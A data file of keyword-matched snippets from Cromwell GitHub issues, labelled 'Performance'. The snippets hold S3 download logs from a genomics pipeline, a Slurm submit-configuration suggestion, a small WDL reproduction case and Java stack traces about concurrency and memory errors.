s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz.tbi; 1608597371711,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:116308,cache,cacheCopy,116308,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz.tbi; 1608597552897,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz; 1608597554503,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz.tbi; 1608597557397,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:171459,cache,cacheCopy,171459,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-71/cacheCopy/SR00c.HG02953.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-71/cacheCopy/SR00c.HG02953.txt.gz.tbi; 1608597597343,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz; 1608597600688,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-116/cacheCopy/SR00c.NA18638.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-116/cacheCopy/SR00c.NA18638.txt.gz; 1608597602076,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:182641,cache,cacheCopy,182641,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-72/cacheCopy/SR00c.HG03007.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-72/cacheCopy/SR00c.HG03007.txt.gz.tbi; 1608597033701,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-114/cacheCopy/SR00c.NA18553.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-114/cacheCopy/SR00c.NA18553.txt.gz; 1608597036753,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-85/cacheCopy/SR00c.HG03604.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-85/cacheCopy/SR00c.HG03604.txt.gz; 1608597038611,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:25927,cache,cacheCopy,25927,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz.tbi; 1608597201756,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz; 1608597204085,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-147/cacheCopy/SR00c.NA20522.txt.gz; 1608597206512,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:72047,cache,cacheCopy,72047,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz.tbi; 1608597162870,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz; 1608597164800,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz.tbi; 1608597167270,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:61470,cache,cacheCopy,61470,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz.tbi; 1608597306259,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz; 1608597308537,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-35/cacheCopy/SR00c.HG01747.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-35/cacheCopy/SR00c.HG01747.txt.gz.tbi; 1608597310848,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evide",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:100102,cache,cacheCopy,100102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->; This is a remark on https://github.com/broadinstitute/cromwell/blob/master/docs/tutorials/HPCSlurmWithLocalScratch.md there is a feature on slum config to edit the sbatch command. You could add in a find and replace in the config to do the same as the tutorial. you can skip the first part of the tutorial by editing the slurm backend config (somewhat hotpatching the scripts on submission time). old submit ; submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". new submit for slurm auto configured job dir: ; submit = """"""; perl -i.bak -wpe 's/^tmpDir=.*/tmpdir=""\$TMPDIR""/g' ${script} && \; sbatch -J ${job_name} --tmp=${disk} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". new submit for /genomics/local/ (not tested tough): ; submit = """"""; perl -i.bak -wpe 's/^tmpDir=.*/tmpdir=""$(mkdir -p ""\/genomics_local\/\$PID_\$HOSTNAME""\/"" && echo ""\/genomics_local\/\$PID_\$HOSTNAME""\/""/g' ${script} && \; sbatch -J ${job_name} --tmp=${disk} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} ${""-c "" +; cpu} --mem ${memory_mb} --wrap ""/bin/bash ${script}""; """""". <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; <!-- This is a clear feature cant you see -->. <!-- Which backend are you running? -->; The backend I'm running on is Slurm hpc with a version 1.0 workflow. This alternative workflow has its downsides but also benefits it is up to the hpc(user) to decide what works best in their own situation. ; <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7357:1169,queue,queue,1169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7357,1,['queue'],['queue']
Performance,"/github.com/broadinstitute/cromwell/commit/33c58ef22b6a8edc4c1912c1416225c79d298f76#diff-39fe7186c2383fc1135f29a9c05e4e57) but I don't; grasp the scope of the change enough to know if this triggers it. In our CWL run, the jobs get submitted to the cluster and run okay based on the; work directories in `cromwell-execution` but the polling dies with:; ```; [2019-01-17 12:34:15,18] [info] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:1459,concurren,concurrent,1459,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['concurren'],['concurrent']
Performance,"0. workflow Test {; <tab>input {; <tab><tab>; <tab>}. <tab>call Echo as echo {; <tab>input:; <tab>}. <tab>output {; <tab>}; }. task Echo {; <tab>input {; <tab>}. <tab>command {; <tab><tab>kill -9 $$; <tab><tab>echo test; <tab>}. <tab>output {; <tab>}; }; ```. Full stacktrace:; ```; [2018-08-29 09:25:20,10] [error] WorkflowManagerActor Workflow 1ed0e19c-fa18-4241-8f6b-0b72e181f59a failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:341); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:341); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:341); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:99); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:152); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.di",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051:1667,concurren,concurrent,1667,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051,1,['concurren'],['concurrent']
Performance,"0.19]; at akka.kamon.instrumentation.ActorCellInstrumentation.aroundBehaviourInvoke(ActorCellInstrumentation.scala:62) [cromwell.jar:0.19]; at akka.actor.ActorCell.invoke(ActorCell.scala:483) [cromwell.jar:0.19]; at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238) [cromwell.jar:0.19]; at akka.dispatch.Mailbox.run(Mailbox.scala:220) [cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; 2016-04-11 22:41:00,528 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,543 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,556 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,617 cromwell-system-akka.actor.default-dispatcher-2683 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,841 cromwell-system-akka.actor.default-dispatcher-2666 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; 2016-04-11 22:41:00,912 cromwell-system-akka.actor.default-dispatcher-2666 INFO - WorkflowActor [UUID(606107ba)]: Call Caching: cache miss; Uncaught error from thread [cromwell-system-akka.actor.default-dispatcher-2676] shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-system]. **java.lang.OutOfMemoryError: Java heap space**; at java.util.Arrays.copyOfRange(Arrays.java:3664)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:9015,cache,cache,9015,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['cache'],['cache']
Performance,"000000000000000]; java.lang.Thread.State: RUNNABLE. ""db-4"" #31 daemon prio=5 os_prio=31 tid=0x00007fb7706e2000 nid=0x8303 waiting on condition [0x000000012ca92000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-3"" #29 daemon prio=5 os_prio=31 tid=0x00007fb76f4b7000 nid=0x7f03 waiting on condition [0x000000012c88c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPool",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:37209,concurren,concurrent,37209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
